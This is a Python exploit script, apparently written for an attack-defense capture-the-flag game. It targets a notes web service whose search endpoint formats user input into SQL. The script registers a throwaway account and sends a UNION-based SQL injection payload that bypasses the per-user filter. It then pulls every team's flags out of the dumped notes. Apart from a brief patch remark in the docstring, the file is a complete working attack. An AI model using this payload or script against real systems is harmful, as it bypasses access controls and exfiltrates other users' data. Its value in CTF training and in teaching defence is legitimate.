"""Exploit for the SecureNotes (web) service — UNION-based SQL injection.

Vulnerability: GET /api/notes/search builds its SQL with Python %-formatting,
dropping the raw `q` parameter into the query text:

    sql = "SELECT id,title,body FROM notes WHERE user_id=%d AND
           (title LIKE '%%%s%%' OR body LIKE '%%%s%%')" % (uid, q, q)

The endpoint returns exactly three columns, so we close the LIKE literal and the
WHERE parenthesis, UNION-select every row of `notes`, and comment out the rest.
The per-user `WHERE user_id=` scope is bypassed, dumping every team's note
bodies — the flags live there. We only need any authenticated session (register
a throwaway user), so the exploit is flag_id-agnostic and steals ALL flags at
once.

Patch (defense): bind the search term with `?` placeholders instead of
formatting it into the SQL, and keep `user_id=?` bound too (see
services/web/solution.md).

Interface: exploit(host, port, flag_id) -> list[str]   # flag_id ignored (dumps all)
Deps: requests.
"""
import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 7

# close the LIKE literal + the AND( parenthesis, UNION in every note, comment the rest.
PAYLOAD = "zzz%') UNION SELECT id,title,body FROM notes-- -"


def _rand(n=12):
    alphabet = string.ascii_lowercase + string.digits
    return random.choice(string.ascii_lowercase) + "".join(
        random.choice(alphabet) for _ in range(n - 1)
    )


def exploit(host, port, flag_id):
    base = "http://%s:%d" % (host, port)
    flags = []
    seen = set()
    try:
        s = requests.Session()
        u, p = _rand(), _rand(16)
        # register + login to obtain a Bearer token for the authenticated search.
        s.post(base + "/api/register", json={"username": u, "password": p}, timeout=TIMEOUT)
        r = s.post(base + "/api/login", json={"username": u, "password": p}, timeout=TIMEOUT)
        token = None
        try:
            token = r.json().get("token")
        except ValueError:
            token = None
        if not token:
            return flags
        headers = {"Authorization": "Bearer " + token}

        r = s.get(base + "/api/notes/search", params={"q": PAYLOAD},
                  headers=headers, timeout=TIMEOUT)
        try:
            notes = r.json().get("notes", [])
        except ValueError:
            notes = []
        for n in notes:
            if not isinstance(n, dict):
                continue
            for field in ("body", "title"):
                for m in FLAG_RE.findall(str(n.get(field) or "")):
                    if m not in seen:
                        seen.add(m)
                        flags.append(m)
    except Exception:
        return flags
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 5001
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for f in exploit(h, p, fid):
        print(f)
